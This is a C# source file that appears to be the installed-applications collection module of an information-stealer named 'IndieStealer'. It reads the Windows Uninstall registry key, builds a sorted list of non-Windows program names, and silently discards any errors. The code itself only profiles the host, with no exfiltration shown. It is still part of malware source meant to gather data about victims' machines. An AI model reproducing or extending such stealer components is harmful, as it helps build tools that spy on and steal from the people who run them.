using System;
using System.Linq;
using Microsoft.Win32;

namespace IndieStealer.Collect.System
{
    class InstalledApps
    {
        public static string Apps = "";
        public static void Grab()
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Uninstall"))
                {
                    if (key != null)
                    {
                        foreach (var subkey in key.GetSubKeyNames())
                        {
                            string value = key.OpenSubKey(subkey)?.GetValue("DisplayName", "Error").ToString();
                            if (value != "Error" && !value.Contains("Windows"))
                                Apps += value + "\n";
                        }

                        string[] _Apps = Apps.Split(new char[] { '\n' }, StringSplitOptions.RemoveEmptyEntries).OrderBy(x => x).ToArray();
                        Apps = string.Empty;
                        foreach (var app in _Apps)
                        {
                            Apps += app + "\n";
                        }
                    }
                       
                }
            }
            catch 
            { } 

        }
    }
}
